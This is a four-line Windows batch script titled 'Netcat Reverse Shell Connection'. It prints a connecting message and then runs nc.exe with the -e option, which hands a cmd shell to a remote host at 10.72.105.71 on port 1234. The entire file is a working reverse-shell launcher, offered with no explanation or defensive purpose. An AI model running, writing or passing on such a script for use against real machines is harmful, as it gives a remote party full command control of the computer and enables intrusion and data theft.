@echo off
title Netcat Reverse Shell Connection
echo Connecting to 10.72.105.71:1234...
nc.exe -e cmd 10.72.105.71 1234

